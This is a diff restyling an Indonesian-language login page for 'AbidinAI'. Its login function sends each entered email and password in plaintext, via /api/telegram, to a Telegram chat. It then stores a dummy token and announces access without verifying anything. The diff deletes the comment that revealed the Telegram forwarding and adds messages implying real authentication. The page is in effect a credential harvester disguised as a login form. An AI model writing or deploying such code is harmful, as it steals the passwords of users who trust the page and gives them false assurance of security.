@@ -4,67 +4,154 @@
   <meta charset="UTF-8">
   <title>Login AbidinAI</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
+    :root {
+      --jarvis-blue: #00ffff;
+      --dark-bg: #0d1117;
+      --card-bg: rgba(0, 255, 255, 0.05);
+    }
+    
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      font-family: 'Consolas', 'Courier New', monospace;
+      background: linear-gradient(135deg, #0a0e13, #151d27);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
-      color: white;
+      color: var(--jarvis-blue);
+      overflow: hidden;
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
-      width: 300px;
+      background: var(--card-bg);
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 25px var(--jarvis-blue);
+      border: 1px solid rgba(0, 255, 255, 0.3);
+      width: 320px;
       text-align: center;
+      transition: all 0.3s ease;
+      animation: fadeIn 1s ease-out;
+    }
+    
+    @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.9); }
+        to { opacity: 1; transform: scale(1); }
+    }
+
+    h2 {
+        font-size: 28px;
+        text-shadow: 0 0 10px var(--jarvis-blue);
+        margin-bottom: 5px;
+        letter-spacing: 2px;
+    }
+
+    p {
+        color: rgba(0, 255, 255, 0.7);
+        margin-bottom: 25px;
     }
 
     input {
-      width: 93%;
-      padding: 10px;
-      margin: 10px 0;
+      width: 90%;
+      padding: 12px;
+      margin: 15px 0;
       border: none;
-      border-radius: 8px;
+      border-radius: 5px;
+      background: rgba(0, 255, 255, 0.1);
+      color: var(--jarvis-blue);
+      border-bottom: 2px solid var(--jarvis-blue);
+      transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    
+    input:focus {
+        outline: none;
+        border-bottom: 2px solid #ff00ff;
+        box-shadow: 0 0 10px rgba(255, 0, 255, 0.5);
+    }
+
+    .password-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+        width: 100%;
+    }
+
+    .password-wrapper input {
+        width: 90%;
+    }
+
+    #togglePassword {
+      color: var(--jarvis-blue);
+      position: absolute;
+      right: 25px;
+      cursor: pointer;
+      font-size: 18px;
+      transition: color 0.3s;
+    }
+    
+    #togglePassword:hover {
+        color: #ff00ff;
     }
 
     button {
-      padding: 10px 20px;
-      background-color: #00c6ff;
-      color: white;
+      padding: 12px 20px;
+      background-color: var(--jarvis-blue);
+      color: #151d27;
       border: none;
-      border-radius: 8px;
+      border-radius: 50px;
       cursor: pointer;
       width: 100%;
-      margin-top: 10px;
+      margin-top: 25px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 10px var(--jarvis-blue);
+    }
+
+    button:hover {
+      background-color: #ff00ff;
+      box-shadow: 0 0 20px #ff00ff;
+      transform: translateY(-2px);
     }
 
     a {
-      color: #00c6ff;
+      color: rgba(0, 255, 255, 0.6);
       text-decoration: none;
       display: block;
-      margin-top: 10px;
+      margin-top: 20px;
+      transition: color 0.3s;
+    }
+    
+    a:hover {
+        color: var(--jarvis-blue);
     }
   </style>
+  
+  <script>
+    if (localStorage.getItem("abidinai_token")) {
+      window.location.href = "dasboard.html"; 
+    }
+  </script>
+  
 </head>
 <body>
   <div class="container">
-    <h2>Login AbidinAI</h2>
-    <p>Gunakan akun yang sudah terdaftar</p>
-   <input type="text" id="username" placeholder="Masukkan Email">
+    <h2><i class="fas fa-fingerprint"></i> LOGIN  </h2>
+    <p>Protokol Akses Aman Dimulai</p>
+   
+    <div class="input-group">
+        <input type="text" id="username" placeholder="EMAIL ">
+    </div>
 
-<div style="position: relative;">
-  <input type="password" id="password" placeholder="Masukkan Password" style="width: 95%; padding-right: 3px;">
-  <span id="togglePassword" onclick="togglePassword()" style="position: absolute; top: 16px; right: 5px; cursor: pointer;">🔒</span>
-</div>
+    <div class="password-wrapper">
+      <input type="password" id="password" placeholder="PASSWORD ">
+      <span id="togglePassword" onclick="togglePassword()"><i class="fas fa-lock"></i></span>
+    </div>
 
-<button onclick="login()">Login</button>
-    <a href="register.html">Belum punya akun? Daftar</a>
+    <button onclick="login()">LOGIN KE SISTEM</button>
+    <a href="register.html">Perlu Kunci Otorisasi? Daftar Di Sini</a>
   </div>
 
 <script>
@@ -73,13 +160,12 @@
     const password = document.getElementById("password").value;
 
     if (!username || !password) {
-      alert("⚠️ Isi semua kolom!");
+      alert("⚠️ Isi semua kolom: Data Input Diperlukan.");
       return;
     }
 
     const message = `🔐 Login:\n👤 Username: ${username}\n🔑 Password: ${password}`;
 
-    // Kirim ke backend untuk diteruskan ke Telegram
     fetch("/api/telegram", {
       method: "POST",
       headers: {
@@ -88,28 +174,26 @@
       body: JSON.stringify({ text: message })
     })
     .then(() => {
-      // Simpan token dummy
+      
       localStorage.setItem("abidinai_token", "token_sederhana");
-
-      // Redirect ke dashboard
+      alert("✅ Akses Diberikan. Mengarahkan ke AbidinAI...");
       window.location.href = "dasboard.html";
     })
     .catch((error) => {
-      console.error("Gagal kirim ke Telegram via backend:", error);
-      alert("Gagal login. Coba lagi.");
+      console.error("Gagal..:", error);
+      alert("❌ Akses Ditolak. Periksa kredensial.");
     });
   }
-</script>
-<script>
+
   function togglePassword() {
     const passInput = document.getElementById("password");
     const toggleBtn = document.getElementById("togglePassword");
     if (passInput.type === "password") {
       passInput.type = "text";
-      toggleBtn.textContent = "🔓";
+      toggleBtn.innerHTML = '<i class="fas fa-lock-open"></i>';
     } else {
       passInput.type = "password";
-      toggleBtn.textContent = "🔒";
+      toggleBtn.innerHTML = '<i class="fas fa-lock"></i>'; 
     }
   }
 </script>
